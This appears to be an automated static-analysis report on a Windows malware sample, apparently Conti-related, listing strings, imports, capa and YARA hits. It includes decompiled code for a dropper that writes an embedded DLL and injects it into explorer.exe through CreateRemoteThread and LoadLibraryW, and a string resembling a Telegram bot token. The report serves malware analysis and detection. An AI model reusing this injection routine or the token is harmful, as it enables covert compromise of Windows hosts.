| 433085 | `.text$_ZN10__cxx..5_Unwind_Context` |
| 152824 | `api-ms-win-crt-e..nment-l1-1-0.dll` |
| 436369 | `.text$_ZNK10__cx..ss_type_infoES2_` |
| 433173 | `.xdata$_ZN10__cx..5_Unwind_Context` |
| 433262 | `.pdata$_ZN10__cx..5_Unwind_Context` |
| 430844 | `.xdata$_ZNK10__c..__upcast_resultE` |
| 430932 | `.pdata$_ZNK10__c..__upcast_resultE` |
| 431733 | `_ZN10__cxxabiv1L..5_Unwind_Context` |
| 435655 | `_ZNK10__cxxabiv1..ss_type_infoES2_` |
| 430757 | `.text$_ZNK10__cx..__upcast_resultE` |
| 153184 | `api-ms-win-crt-string-l1-1-0.dll` |
| 152968 | `api-ms-win-crt-p..ivate-l1-1-0.dll` |
| 153224 | `api-ms-win-crt-u..ility-l1-1-0.dll` |
| 124608 | `8602432148:AAGpo..DQ7S3TlggkEMOVQE` |
| 429532 | `_ZNK10__cxxabiv1..__upcast_resultE` |
| 153040 | `api-ms-win-crt-r..ntime-l1-1-0.dll` |
| 152916 | `api-ms-win-crt-locale-l1-1-0.dll` |
| 434981 | `.pdata$_ZL23__gx..Unwind_Exception` |
| 429986 | `.xdata$_ZNK10__c..srcExPKvPKS0_S2_` |
| 434904 | `.xdata$_ZL23__gx..Unwind_Exception` |
| 430064 | `.pdata$_ZNK10__c..srcExPKvPKS0_S2_` |
| 152784 | `api-ms-win-crt-c..nvert-l1-1-0.dll` |
| 153112 | `api-ms-win-crt-stdio-l1-1-0.dll` |
| 438079 | `.pdata$_ZNKSt9ty..ss_type_infoEPPv` |
| 186060 | `
GNU C99 16.1.0 ..u99 -fno-builtin` |
| 189875 | `:GNU C99 16.1.0 ..u99 -fno-builtin` |

### Imports (66)
| EA | Name | Type | Refs |
|---|---|---|---|
| 473376 | kernel32.CloseHandle | IMPORT | 4 |
| 473384 | kernel32.CreateFileW | IMPORT | 1 |
| 473392 | kernel32.CreateRemoteThread | IMPORT | 2 |
| 473400 | kernel32.CreateToolhelp32Snapshot | IMPORT | 1 |
| 473408 | kernel32.DeleteCriticalSection | IMPORT | 1 |
| 473416 | kernel32.DeleteFileW | IMPORT | 2 |
| 473424 | kernel32.EnterCriticalSection | IMPORT | 3 |
| 473432 | kernel32.GetCurrentDirectoryW | IMPORT | 1 |
| 473440 | kernel32.GetLastError | IMPORT | 2 |
| 473448 | kernel32.GetModuleHandleA | IMPORT | 1 |
| 473456 | kernel32.GetProcAddress | IMPORT | 1 |
| 473464 | kernel32.GetStartupInfoA | IMPORT | 1 |
| 473472 | kernel32.GetTempFileNameW | IMPORT | 1 |
| 473480 | kernel32.GetTempPathW | IMPORT | 1 |
| 473488 | kernel32.GetTickCount | IMPORT | 1 |
| 473496 | kernel32.InitializeCriticalSection | IMPORT | 1 |
| 473504 | kernel32.IsDBCSLeadByte | IMPORT | 1 |
| 473512 | kernel32.LeaveCriticalSection | IMPORT | 3 |
| 473520 | kernel32.OpenProcess | IMPORT | 2 |
| 473528 | kernel32.Process32First | IMPORT | 1 |
| 473536 | kernel32.Process32Next | IMPORT | 1 |
| 473544 | kernel32.SetUnhandledExceptionFilter | IMPORT | 1 |
| 473552 | kernel32.Sleep | IMPORT | 1 |
| 473560 | kernel32.TlsGetValue | IMPORT | 1 |
| 473568 | kernel32.VirtualAllocEx | IMPORT | 1 |
| 473576 | kernel32.VirtualFreeEx | IMPORT | 1 |
| 473584 | kernel32.VirtualProtect | IMPORT | 2 |
| 473592 | kernel32.VirtualQuery | IMPORT | 1 |
| 473600 | kernel32.WaitForSingleObject | IMPORT | 1 |
| 473608 | kernel32.WriteFile | IMPORT | 1 |
| 473616 | kernel32.WriteProcessMemory | IMPORT | 2 |
| 473632 | api-ms-win-crt-environment-l1-1-0.__p__environ | IMPORT | 2 |
| 473648 | api-ms-win-crt-heap-l1-1-0._set_new_mode | IMPORT | 2 |
| 473656 | api-ms-win-crt-heap-l1-1-0.calloc | IMPORT | 1 |
| 473664 | api-ms-win-crt-heap-l1-1-0.free | IMPORT | 1 |
| 473672 | api-ms-win-crt-heap-l1-1-0.malloc | IMPORT | 1 |
| 473688 | api-ms-win-crt-locale-l1-1-0._configthreadlocale | IMPORT | 2 |
| 473704 | api-ms-win-crt-math-l1-1-0.__setusermatherr | IMPORT | 2 |
| 473720 | api-ms-win-crt-private-l1-1-0.memcpy | IMPORT | 2 |
| 473736 | api-ms-win-crt-runtime-l1-1-0.__p___argc | IMPORT | 2 |
| 473744 | api-ms-win-crt-runtime-l1-1-0.__p___argv | IMPORT | 1 |
| 473752 | api-ms-win-crt-runtime-l1-1-0.__p__acmdln | IMPORT | 1 |
| 473760 | api-ms-win-crt-runtime-l1-1-0._cexit | IMPORT | 1 |
| 473768 | api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv | IMPORT | 1 |
| 473776 | api-ms-win-crt-runtime-l1-1-0._crt_atexit | IMPORT | 1 |
| 473784 | api-ms-win-crt-runtime-l1-1-0._exit | IMPORT | 1 |
| 473792 | api-ms-win-crt-runtime-l1-1-0._initialize_narrow_environment | IMPORT | 1 |
| 473800 | api-ms-win-crt-runtime-l1-1-0._seh_filter_exe | IMPORT | 1 |
| 473808 | api-ms-win-crt-runtime-l1-1-0._initterm | IMPORT | 1 |
| 473816 | api-ms-win-crt-runtime-l1-1-0._initterm_e | IMPORT | 1 |
| 473824 | api-ms-win-crt-runtime-l1-1-0._set_app_type | IMPORT | 1 |
| 473832 | api-ms-win-crt-runtime-l1-1-0._set_invalid_parameter_handler | IMPORT | 1 |
| 473840 | api-ms-win-crt-runtime-l1-1-0.abort | IMPORT | 1 |
| 473848 | api-ms-win-crt-runtime-l1-1-0.exit | IMPORT | 1 |
| 473864 | api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func | IMPORT | 2 |
| 473872 | api-ms-win-crt-stdio-l1-1-0.__p__commode | IMPORT | 1 |
| 473880 | api-ms-win-crt-stdio-l1-1-0.__p__fmode | IMPORT | 1 |
| 473888 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf | IMPORT | 1 |
| 473896 | api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf | IMPORT | 1 |
| 473904 | api-ms-win-crt-stdio-l1-1-0.fflush | IMPORT | 1 |
| 473912 | api-ms-win-crt-stdio-l1-1-0.setvbuf | IMPORT | 1 |
| 473928 | api-ms-win-crt-string-l1-1-0._stricmp | IMPORT | 3 |
| 473936 | api-ms-win-crt-string-l1-1-0.memset | IMPORT | 1 |
| 473944 | api-ms-win-crt-string-l1-1-0.strlen | IMPORT | 1 |
| 473952 | api-ms-win-crt-string-l1-1-0.strncmp | IMPORT | 1 |
| 473960 | api-ms-win-crt-string-l1-1-0.wcslen | IMPORT | 1 |

### Functions (30)
| EA | Name |
|---|---|
| 8672 | sub_140002be0 |
| 2896 | sub_140001550 |
| 4336 | sub_140001af0 |
| 6023 | sub_140002187 |
| 6352 | sub_1400022d0 |
| 5900 | sub_14000210c |
| 6192 | sub_140002230 |
| 1591 | sub_140001037 |
| 2736 | sub_1400014b0 |
| 3936 | 0 |
| 2624 | EntryPoint |
| 3904 | 1 |
| 8080 | jmp_api-ms-win-crt-string-l1-1-0._stricmp |
| 8088 | jmp_api-ms-win-crt-string-l1-1-0.memset |
| 8096 | jmp_api-ms-win-crt-string-l1-1-0.strlen |
| 8104 | jmp_api-ms-win-crt-string-l1-1-0.strncmp |
| 8112 | jmp_api-ms-win-crt-string-l1-1-0.wcslen |
| 8128 | jmp_api-ms-win-crt-stdio-l1-1-0.__acrt_iob_func |
| 8136 | jmp_api-ms-win-crt-stdio-l1-1-0.__p__commode |
| 8144 | jmp_api-ms-win-crt-stdio-l1-1-0.__p__fmode |
| 8152 | jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vfprintf |
| 8160 | jmp_api-ms-win-crt-stdio-l1-1-0.__stdio_common_vswprintf |
| 8168 | jmp_api-ms-win-crt-stdio-l1-1-0.fflush |
| 8176 | jmp_api-ms-win-crt-stdio-l1-1-0.setvbuf |
| 8192 | jmp_api-ms-win-crt-runtime-l1-1-0.__p___argc |
| 8200 | jmp_api-ms-win-crt-runtime-l1-1-0.__p___argv |
| 8208 | jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln |
| 8216 | jmp_api-ms-win-crt-runtime-l1-1-0._cexit |
| 8224 | jmp_api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv |
| 8232 | jmp_api-ms-win-crt-runtime-l1-1-0._crt_atexit |

### Decompilations (top 6)
#### 8672 — sub_140002be0
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140002be0(void)

{
    char *pcVar1;
    bool bVar2;
    bool bVar3;
    bool bVar4;
    code *pcVar5;
    code *pcVar6;
    code *pcVar7;
    undefined4 uVar8;
    int32_t iVar9;
    int64_t iVar10;
    int64_t iVar11;
    int64_t iVar12;
    undefined8 uVar13;
    int64_t iVar14;
    char **ppcVar15;
    char cVar16;
    uint32_t uVar17;
    char *pcVar18;
    undefined4 uVar19;
    undefined8 in_stack_fffffffffffffb78;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [392];
    undefined8 uStack_b0;
    undefined auStack_88 [60];
    uint8_t uStack_4c;
    undefined2 uStack_48;
    
    bVar3 = false;
    bVar2 = false;
    uStack_b0 = 0x140002bf1;
    func_0x000140001910();
    uStack_b0 = 0x140002bf6;
    ppcVar15 = jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln();
    pcVar6 = kernel32.IsDBCSLeadByte;
    uVar19 = in_stack_fffffffffffffb78 >> 0x20;
    pcVar18 = *ppcVar15;
    if (pcVar18 == 0x0) {
        pcVar18 = "";
    }
    else {
code_r0x000140002c10:
        cVar16 = *pcVar18;
        if (' ' < cVar16) goto code_r0x000140002c3d;
        while (uVar19 = in_stack_fffffffffffffb78 >> 0x20, cVar16 != '\0') {
            if (!bVar2) goto code_r0x000140002c64;
            uStack_b0 = 0x140002c22;
            iVar9 = (*pcVar6)();
            pcVar1 = pcVar18;
            while( true ) {
                pcVar18 = pcVar1 + 1;
                if ((iVar9 == 0) || (pcVar1[1] == '\0')) goto code_r0x000140002c10;
                cVar16 = pcVar1[2];
                pcVar18 = pcVar1 + 2;
                if (cVar16 < '!') break;
code_r0x000140002c3d:
                bVar4 = bVar2 ^ 1;
                bVar2 = bVar3;
                if (cVar16 == '\"') {
                    bVar2 = bVar4;
                }
                uStack_b0 = 0x140002c4a;
                iVar9 = (*pcVar6)();
                pcVar1 = pcVar18;
                bVar3 = bVar2;
            }
        }
    }
    goto code_r0x000140002c70;
    while (*pcVar1 < '!') {
code_r0x000140002c64:
        pcVar1 = pcVar18 + 1;
        pcVar18 = pcVar18 + 1;
        if (*pcVar1 == '\0') break;
    }
code_r0x000140002c70:
    uStack_b0 = 0x140002c7b;
    (*kernel32.GetStartupInfoA)(auStack_88);
    if ((uStack_4c & 1) == 0) {
        uStack_48 = 10;
    }
    iVar9 = (*kernel32.GetTempPathW)(0x104, auStack_448, pcVar18, uStack_48);
    if (iVar9 != 0) {
        iVar9 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar9 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar8 = (*kernel32.GetTickCount)();
            uVar13 = CONCAT44(uVar19, uVar8);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar13);
            uVar19 = uVar13 >> 0x20;
        }
        pcVar6 = kernel32.CreateFileW;
        iVar10 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar19, 2), 0x80, 0);
        pcVar7 = kernel32.WriteFile;
        if (iVar10 != -1) {
            uVar19 = 0;
            (*kernel32.WriteFile)(iVar10, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar5 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar10);
            iVar9 = sub_1400014b0("explorer.exe");
            if ((iVar9 != 0) && (iVar10 = (*kernel32.OpenProcess)(0x43a, 0, iVar9), iVar10 != 0)) {
                iVar11 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                iVar11 = iVar11 * 2 + 2;
                uVar13 = CONCAT44(uVar19, 4);
                iVar12 = (*kernel32.VirtualAllocEx)(iVar10, 0, iVar11, 0x3000, uVar13);
                uVar19 = uVar13 >> 0x20;
                if (iVar12 != 0) {
                    (*kernel32.WriteProcessMemory)(iVar10, iVar12, auStack_238, iVar11, 0);
                    uVar13 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                    uVar13 = (*kernel32.GetProcAddre
```
#### 2896 — sub_140001550
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140001550(void)

{
    code *pcVar1;
    code *pcVar2;
    code *pcVar3;
    int32_t iVar4;
    undefined4 uVar5;
    int64_t iVar6;
    int64_t iVar7;
    int64_t iVar8;
    undefined8 uVar9;
    int64_t iVar10;
    uint32_t uVar11;
    undefined8 in_stack_fffffffffffffb78;
    undefined4 uVar12;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [536];
    
    uVar12 = in_stack_fffffffffffffb78 >> 0x20;
    iVar4 = (*kernel32.GetTempPathW)(0x104, auStack_448);
    if (iVar4 != 0) {
        iVar4 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar4 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar5 = (*kernel32.GetTickCount)();
            uVar9 = CONCAT44(uVar12, uVar5);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar9);
            uVar12 = uVar9 >> 0x20;
        }
        pcVar2 = kernel32.CreateFileW;
        iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);
        pcVar3 = kernel32.WriteFile;
        if (iVar6 != -1) {
            uVar12 = 0;
            (*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar1 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar6);
            iVar4 = sub_1400014b0("explorer.exe");
            if (iVar4 != 0) {
                iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);
                if (iVar6 != 0) {
                    iVar7 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                    iVar7 = iVar7 * 2 + 2;
                    uVar9 = CONCAT44(uVar12, 4);
                    iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar7, 0x3000, uVar9);
                    uVar12 = uVar9 >> 0x20;
                    if (iVar8 != 0) {
                        (*kernel32.WriteProcessMemory)(iVar6, iVar8, auStack_238, iVar7, 0);
                        uVar9 = (*kernel32.GetModuleHandleA)("kernel32.dll");
                        uVar9 = (*kernel32.GetProcAddress)(uVar9, "LoadLibraryW");
                        iVar7 = iVar8;
                        iVar10 = (*kernel32.CreateRemoteThread)(iVar6, 0, 0, uVar9, iVar8, 0, 0);
                        uVar12 = iVar7 >> 0x20;
                        if (iVar10 != 0) {
                            (*kernel32.WaitForSingleObject)(iVar10, 0xffffffff);
                            (*pcVar1)(iVar10);
                        }
                        (*kernel32.VirtualFreeEx)(iVar6, iVar8, 0, 0x8000);
                    }
                    (*pcVar1)(iVar6);
                    iVar6 = (*pcVar2)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 3), 0, 0);
                    if (iVar6 != -1) {
                        uStack_44d = 0;
                        if ([0x0x140003000] != 0) {
                            uVar11 = 0;
                            do {
                                uVar11 = uVar11 + 1;
                                (*pcVar3)(iVar6, &uStack_44d, 1, auStack_44c, 0);
                            } while (uVar11 < [0x0x140003000]);
                        }
                        (*pcVar1)(iVar6);
                    }
                    (*kernel32.DeleteFileW)(auStack_238);
                    return 0;
                }
            }
            (*kernel32.DeleteFileW)(auStack_238);
        }
    }
    return 1;
}

```
#### 4336 — sub_140001af0
```c

/* WARNING: Possible PIC construction at 0x000140001c77: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001cac: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001e40: Changing call to branch */
/* WARNING: Possible PIC construction at 0x00014000204e: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001dde: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140002005: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f61: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f04: Changing call to branch */
/* WARNING: Removing unreachable block (ram,0x000140001f66) */
/* WARNING: Removing unreachable block (ram,0x00014000200a) */
/* WARNING: Removing unreachable block (ram,0x000140001de3) */
/* WARNING: Removing unreachable block (ram,0x000140001e45) */
/* WARNING: Removing unreachable block (ram,0x000140001e5b) */
/* WARNING: Removing unreachable block (ram,0x000140001cb5) */
/* WARNING: Removing unreachable block (ram,0x000140001cf0) */
/* WARNING: Removing unreachable block (ram,0x000140001d49) */
/* WARNING: Removing unreachable block (ram,0x000140001ec0) */
/* WARNING: Removing unreachable block (ram,0x000140001ec8) */
/* WARNING: Removing unreachable block (ram,0x00014000202b) */
/* WARNING: Removing unreachable block (ram,0x000140002036) */
/* WARNING: Removing unreachable block (ram,0x000140001d53) */
/* WARNING: Removing unreachable block (ram,0x000140001d5d) */
/* WARNING: Removing unreachable block (ram,0x000140001ed5) */
/* WARNING: Removing unreachable block (ram,0x000140001ede) */
/* WARNING: Removing unreachable block (ram,0x000140001d68) */
/* WARNING: Removing unreachable block (ram,0x000140002053) */
/* WARNING: Removing unreachable block (ram,0x000140002070) */
/* WARNING: Removing unreachable block (ram,0x000140002099) */
/* WARNING: Removing unreachable block (ram,0x000140001d74) */
/* WARNING: Removing unreachable block (ram,0x000140001dfd) */
/* WARNING: Removing unreachable block (ram,0x000140001f80) */
/* WARNING: Removing unreachable block (ram,0x000140002010) */
/* WARNING: Removing unreachable block (ram,0x000140001f8b) */
/* WARNING: Removing unreachable block (ram,0x000140001f9e) */
/* WARNING: Removing unreachable block (ram,0x000140001fac) */
/* WARNING: Removing unreachable block (ram,0x000140001fb4) */
/* WARNING: Removing unreachable block (ram,0x000140001df4) */
/* WARNING: Removing unreachable block (ram,0x000140001e19) */
/* WARNING: Removing unreachable block (ram,0x000140001d90) */
/* WARNING: Removing unreachable block (ram,0x000140001f28) */
/* WARNING: Removing unreachable block (ram,0x000140002020) */
/* WARNING: Removing unreachable block (ram,0x000140001f34) */
/* WARNING: Removing unreachable block (ram,0x000140001f40) */
/* WARNING: Removing unreachable block (ram,0x000140001f4e) */
/* WARNING: Removing unreachable block (ram,0x000140001f5a) */
/* WARNING: Removing unreachable block (ram,0x000140001d99) */
/* WARNING: Removing unreachable block (ram,0x000140001da2) */
/* WARNING: Removing unreachable block (ram,0x000140001fe0) */
/* WARNING: Removing unreachable block (ram,0x000140001daf) */
/* WARNING: Removing unreachable block (ram,0x000140001dcb) */
/* WARNING: Removing unreachable block (ram,0x000140001ff6) */
/* WARNING: Removing unreachable block (ram,0x000140001dd7) */
/* WARNING: Removing unreachable block (ram,0x000140001e1f) */
/* WARNING: Removing unreachable block (ram,0x00014000203f) */
/* WARNING: Removing unreachable block (ram,0x000140001e28) */
/* WARNING: Removing unreachable block (ram,0x000140001d84) */
/* WARNING: Removing unreachable block (ram,0x000140001f09) */
/* WARNING: Removing unreachable block (ram,0x000140001ef0) */
/* WARNING: Removing unreachable block (ram,0x000140001f20) */
/* WARNING: Removing unreachable block (ram,0x000140001e60) */
/* WARNING: Removing unreachable block (ram,0x00014
```

### Carved Files (1)
| Name | Type | Size |
|---|---|---|
| ? | PE | 342016 |

### Virtual Files (1)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| MANIF/1/unk | 1167 | - |

### Structures (43)
| Name | EA |
|---|---|
| MZ | 0 |
| PE | 128 |
| OptionalHeader | 152 |
| Sections | 392 |
| TlsDirectory | 460416 |
| TlsCallbacks | 463328 |
| ExceptionTable | 464384 |
| ImportTable | 472576 |
| kernel32.OFT | 472776 |
| api-ms-win-crt-environment-l1-1-0.OFT | 473032 |
| api-ms-win-crt-heap-l1-1-0.OFT | 473048 |
| api-ms-win-crt-locale-l1-1-0.OFT | 473088 |
| api-ms-win-crt-math-l1-1-0.OFT | 473104 |
| api-ms-win-crt-private-l1-1-0.OFT | 473120 |
| api-ms-win-crt-runtime-l1-1-0.OFT | 473136 |
| api-ms-win-crt-stdio-l1-1-0.OFT | 473264 |
| api-ms-win-crt-string-l1-1-0.OFT | 473328 |
| kernel32.FT | 473376 |
| api-ms-win-crt-environment-l1-1-0.FT | 473632 |
| api-ms-win-crt-heap-l1-1-0.FT | 473648 |
| api-ms-win-crt-locale-l1-1-0.FT | 473688 |
| api-ms-win-crt-math-l1-1-0.FT | 473704 |
| api-ms-win-crt-private-l1-1-0.FT | 473720 |
| api-ms-win-crt-runtime-l1-1-0.FT | 473736 |
| api-ms-win-crt-stdio-l1-1-0.FT | 473864 |
| api-ms-win-crt-string-l1-1-0.FT | 473928 |
| ImportNames | 473976 |
| ImportNames | 475212 |
| ImportNames | 475232 |
| ImportNames | 475288 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 17 · duration_s: 1.09

| Rule | ATT&CK | MBC |
|---|---|---|
| encrypt data using RC4 PRGA | T1027:Obfuscated Files or Information | C0027.009:Encrypt Data, C0021.004:Generate Pseudo-random Sequence |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
| contain an embedded PE file |  | B0023:Install Additional Program |
| delete file |  | C0047:Delete File |
| write file on Windows |  | C0052:Writes File |
| allocate or change RWX memory |  | C0007:Allocate Memory |
| inject dll | T1055.001:Process Injection |  |
| terminate process |  | C0018:Terminate Process |
| create thread |  | C0038:Create Thread |
| link function at runtime on Windows | T1129:Shared Modules |  |
| enumerate PE sections |  | B0046.001:Code Discovery |
| parse PE header | T1129:Shared Modules |  |
| execute shellcode via indirect call |  | C0007:Allocate Memory |

## PE Imports / Signals
import_count: 66

| label | api_match | ATT&CK |
|---|---|---|
| allocate_memory | VirtualAllocEx | T1055 |
| write_process_memory | WriteProcessMemory | T1055 |
| create_remote_thread | CreateRemoteThread | T1055 |
| get_proc_address | GetProcAddress | T1129 |
| change_memory_protection | VirtualProtect | T1055 |

## YARA Matches (pipeline)
Total matches: 12

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| spyeye | - | $f@452832 len=8 |
| IP | - | $ipv4@124590 len=28; $ipv6@124914 len=6 |
| contains_base64 | - | $a@1600 len=12 |
| url | - | $url_regex@124032 len=56 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasOverlay | - |  |
| SEH__v4 | - | $@592021 len=12 |
| inject_thread | - | $c1@465120 len=11; $c2@465220 len=14; $c4@465322 len=18; $c5@464790 len=18; $c6@150610 len=12; $c7@465120 len=11 |
| screenshot | - | $d1@152012 len=9; $d2@152784 len=10; $c1@150226 len=6; $c2@151934 len=5 |
| win_mutex | - | $c1@150576 len=11 |

## Generated YARA Meta
```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "spyeye",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$f",
          "offset": 452832,
          "length": 8,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 124590,
          "length": 28,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 124914,
          "length": 6,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$a",
          "offset": 1600,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 124032,
          "length": 56,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "SEH__v4",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$",
          "offset": 592021,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "inject_thread",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$c1",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 465220,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 465322,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c5",
          "offset": 464790,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c6",
          "offset": 150610,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$c7",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "screenshot",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177
```

## FLOSS Strings
Total strings: 7006 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 7006}`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.data`
- `.rdata`
- `@.pdata`
- `@.xdata`
- `.idata`
- `@.reloc`
- `=CCG u`
- `AWAVAUATUWVSH`
- `X[^_]A\A]A^A_`
- `8MZuJHcP<H`
- `AVWVSH`
- `UAVAUATWVSH`
- `[^_A\A]A^]`
- `([^_]H`
- `@' t	H`
- `.edata`
- `@.idata`
- `.reloc`
- `AVATUWVS`
- `TestpassI`
- `[^_]A\A^A_`
- `h;\$Xs#I`
- `J(A;J,}4Hc`
- `I(D;I,}FIc`
- `<_t`<ntT`
- `R(A;R,}-Hc`
- `ATUWVSH`
- `P[^_]A\`
- `_GLOBAL_H9`
- `BHA;R,}VHc`
- `C8;C<|`
- `X[^_A^`
- `0[^_]A\`
- `R(A;R,}`
- `AVUWVSH`
- `P[^_]A^`
- `U(;U,}:Hc`
- `<Et6<Qt2H`
- `D$0<Qt@H`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x140001440
```asm
╎   ;-- WinMainCRTStartup:
┌ 18: entry0 ();
│       ╎   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
│       ╎   0x140001447      c70001000000   mov dword [rax], 1
└       └─< 0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup  ; synchapi.h:138:0
```
### 0x140001000
```asm
;-- section..text:
            ; DATA XREF from sym.__tmainCRTStartup @ 0x1400011a0(r)
┌ 1: sym.__mingw_invalidParameterHandler ();
└           0x140001000      c3             ret                        ; synchapi.h:88:0 ; [00] -r-x section size 8192 named .text
```
### 0x140001010
```asm
; DATA XREF from sym.__tmainCRTStartup @ 0x14000139c(r)
┌ 31: sym.cpp_unhandled_exception_filter (int64_t arg1);
│           ; arg int64_t arg1 @ rcx
│           0x140001010      31d2           xor edx, edx               ; synchapi.h:103:0
│           0x140001012      488b09         mov rcx, qword [rcx]       ; synchapi.h:118:0 ; arg1
│           0x140001015      8b01           mov eax, dword [rcx]       ; arg1
│           0x140001017      25ffffff20     and eax, 0x20ffffff
│           0x14000101c      3d43434720     cmp eax, 0x20474343        ; 'CCG '
│       ┌─< 0x140001021      7509           jne 0x14000102c
│       │   0x140001023      8b5104         mov edx, dword [rcx + 4]   ; synchapi.h:119:0 ; arg1
│       │   0x140001026      83e201         and edx, 1
│       │   0x140001029      83ea01         sub edx, 1                 ; synchapi.h:118:0
